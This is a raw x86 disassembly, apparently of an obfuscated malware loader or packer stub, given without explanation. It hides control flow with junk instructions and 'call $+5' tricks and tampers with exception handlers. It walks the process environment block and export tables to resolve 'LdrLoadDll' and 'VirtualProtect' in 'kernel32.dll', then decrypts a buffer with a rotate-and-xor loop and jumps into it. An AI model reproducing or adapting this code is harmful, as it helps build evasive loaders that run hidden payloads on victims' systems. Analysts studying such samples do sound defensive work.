_start
pushad
xor ecx ecx
push esp
test ebx ebx
sbb ecx 0xffffffff
add esp 0x4
mov esi [ esp - 0x4 ]
inc ecx
sub esi 0x4
add ecx 0x1
neg ecx
call $+5
sub [ esi ] ecx
retn
sub_6ad0202d
and eax 0x0
add eax 0x0
test eax eax
mov ebx 0x0
adc ebx eax
xor esi esi
xor esi eax
stc
sbb bh 0x0
test esi esi
sbb bh 0x1
mov bl bh
call $+5
and ebx ebx
sbb esi 0xffffffff
push [ esp ]
pop edi
movzx ecx [ edi + esi - 0x2 ]
add esp 0xfffffffc
mov [ esp ] ecx
sub ecx ebx
pop ecx
jne r-xdata
add [ esp ] eax
jmp [ esp ]
sub eax eax
add eax esi
sub_6ad020ab
push [ fs : 0x0 ]
or ecx ecx
adc edi esi
and eax 0x0
or eax 0xffff
not ebx
test ebx ebx
adc edi esi
mov [ fs : 0x0 ] esp
and edi ebx
test eax eax
adc edi esi
test ecx ecx
jae r-xdata
call $+5
call sub_6ad020ab
call $+5
mov [ esp ] ebx
mov ebx 0x0
xor ebx [ esp + 0x10 ]
or edi edi
sbb [ ebx + 0xb8 ] 0xffffffff
and ecx ecx
adc [ ebx + 0xb8 ] 0x1
add esp 0x4
mov ebx [ esp - 0x4 ]
xor eax eax
retn 0x10
mov ecx [ esp ]
add esp 0x4
push [ esp ]
pop ecx
mov [ fs : 0x0 ] ecx
test edx edx
adc esp 0x8
sub esi esi
add esi edi
mov ecx 0x0
add ecx [ edi + 0x3c ]
add edi ecx
mov ecx 0x0
add ecx 0x4550
xor edx edx
add edx [ edi ]
add esp 0xfffffffc
mov [ esp ] ecx
xor ecx edx
pop ecx
jne r-xdata
jmp [ esp ]
popad
and edx edx
mov eax 0x0
adc eax 0x1
retn 0xc
mov ecx 0x0
add ecx [ edi + 0x78 ]
push ecx
pop edi
test edi edi
adc edi esi
sub esp 0x4
mov [ esp ] edi
push [ edi + 0x20 ]
pop ecx
mov edi 0x0
or edi ecx
test edx edx
adc edi esi
call $+5
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
pop esi
pop ebx
add esp 0xfffffffc
mov [ esp ] edx
xor edx [ esp ]
sub esp 0xfffffffc
mov eax 0x0
sub eax esi
neg eax
mov ecx 0x0
sub ecx [ esi ]
neg ecx
or edi edi
mov esi 0x0
adc esi ecx
call $+5
push esp
pop ebp
or edx edx
adc esi ebx
push 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
xor edi edi
or edi esp
test ecx ecx
mov ecx 0x0
adc ecx 0xb
[ esi ] [ edi ]
je r-xdata
and esi esi
sbb edi esi
xor ecx ecx
mov ecx [ edi ]
mov edx 0x5a4d
and ecx eax
sub esp 0x4
mov [ esp ] edx
or edi edi
sbb edx ecx
pop edx
je r-xdata
sub esp esp
add esp ebp
pop esi
add esp 0xfffffffc
mov [ esp ] ebx
push edx
mov ebx [ esp ]
add esp 0x4
pop esi
pop edi
mov eax 0x0
sub eax edi
neg eax
sub ecx ecx
add ecx [ edi + 0x24 ]
mov edi 0x0
or edi ecx
add edi esi
and ecx ecx
mov ecx 0x0
adc ecx [ edi + ebx * 2 ]
and ecx 0xffff
mov ebx ecx
mov ecx 0x0
xor ecx [ eax + 0x10 ]
or ebx ebx
sbb ebx ecx
test ebx ebx
sbb ebx 0xffffffff
and edi 0x0
add edi [ eax + 0x1c ]
or edi edi
adc edi esi
and ecx 0x0
add ecx [ edi + ebx * 4 ]
add esi ecx
and ebp 0x0
add ebp esp
push ecx
xor ecx [ esp ]
add esp 0x4
call $+5
mov [ esp ] ecx
mov edi 0x0
sub edi esp
neg edi
add esp 0xfffffffc
mov [ esp ] ecx
add esp 0xfffffffc
mov [ esp ] 0x6c006c
push 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
sub esp 0x4
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
push 0x1a0018
and edx 0x0
or edx esp
add esp 0xfffffffc
mov [ esp ] edi
push edx
add esp 0xfffffffc
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] esi
push edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
call ebx
xor eax eax
or eax [ esi ]
sub esp 0x4
mov [ esp ] eax
add esp 0x4
mov ecx [ esp - 0x4 ]
xor edx edx
add edx [ fs : 0x30 ]
and esi 0x0
add esi [ edx + 0x10 ]
mov [ esi + 0x18 ] ecx
mov esp 0x0
sub esp ebp
neg esp
mov edx 0x0
or edx [ fs : 0x30 ]
xor esi esi
xor esi [ edx + 0x10 ]
mov edi [ esi + 0x18 ]
xor esi esi
add esi edi
mov ecx 0x0
sub ecx [ edi + 0x3c ]
neg ecx
test edi edi
adc edi ecx
xor ecx ecx
add ecx [ edi + 0x78 ]
push ecx
pop edi
add edi esi
sub esp 0x4
mov [ esp ] edi
mov ecx 0x0
xor ecx [ edi + 0x20 ]
mov edi 0x0
or edi ecx
add edi esi
sub esp 0x4
mov [ esp ] esi
call $+5
mov [ esp ] edi
add esp 0x4
mov esi [ esp - 0x4 ]
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
or esi esi
sbb esp 0xfffffffc
mov eax 0x0
or eax esi
mov ecx 0x0
or ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
sub ebp ebp
add ebp esp
add esi ebx
call $+5
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
xor edi edi
xor edi esp
xor ecx ecx
or ecx 0xf
[ esi ] [ edi ]
je r-xdata
or edx edx
adc edx 0x1
and ecx ecx
adc eax 0x4
and esi 0x0
or esi [ eax ]
or edi edi
mov esp 0x0
adc esp ebp
jmp [ esp ]
mov esp 0x0
xor esp ebp
mov esi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov edi [ esp - 0x4 ]
push edi
pop eax
mov ecx 0x0
sub ecx [ edi + 0x24 ]
neg ecx
and edi 0x0
or edi ecx
add edi esi
mov ecx 0x0
sub ecx [ edi + ebx * 2 ]
neg ecx
and ecx 0xffff
mov ebx 0x0
add ebx ecx
xor ecx ecx
add ecx [ eax + 0x10 ]
and edx edx
sbb ebx ecx
add ebx 0x1
xor edi edi
xor edi [ eax + 0x1c ]
and ebx ebx
adc edi esi
xor ecx ecx
xor ecx [ edi + ebx * 4 ]
add esi ecx
and eax 0x0
or eax 0x1000
call $+5
add esp 0x4
mov edi [ esp - 0x4 ]
and edi 0xfffff000
add edi eax
add edi eax
push edi
and edx 0x0
add edx 0x4
call $+5
and ebx ebx
adc edi eax
xor ecx ecx
add ecx [ edi ]
sub edx 0x1
je r-xdata
sub edx 0xffffffff
add eax 0x4
mov esi 0x0
add esi [ eax ]
push ebp
pop esp
jmp [ esp ]
mov ecx [ esp ]
add esp 0x4
pop edi
call $+5
mov [ esp ] ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
call $+5
mov [ esp ] 0x45df
add esp 0xfffffffc
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edi
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
and ecx ecx
adc eax 0x1d
call $+5
mov [ esp ] eax
sub esp 0x4
mov [ esp ] ebp
mov ebp esp
and esi esi
adc ebx 0x5
jmp ebx
jmp [ esp ]
sub_6ad02516
add esp 0x4
mov ebx [ esp - 0x4 ]
xor edi edi
add edi esi
and eax 0x0
add eax 0xc
or edx edx
adc edi eax
mov esi 0x0
or esi edi
and ebp 0x0
add ebp edi
mov ecx 0x0
add ecx 0x453d
sub edx edx
add edx ecx
call $+5
mov eax 0x0
sub eax [ esi ]
neg eax
rol al cl
push edx
xor eax [ esp ]
and esi esi
sbb esp 0xfffffffc
sub esp 0x4
mov [ esp ] ecx
xor ecx ecx
or ecx 0x40
cmp ebx ecx
je r-xdata
test ecx ecx
sbb esi 0xffffffff
pop ecx
and edi edi
sbb ecx 0x1
je r-xdata
stosb [ edi ]
add esp 0x4
mov eax [ esp - 0x4 ]
call ebp
add eax ebx
and edx edx
adc ecx edx
popad
and edx edx
mov eax 0x0
adc eax 0x1
retn 0xc
jmp [ esp ]
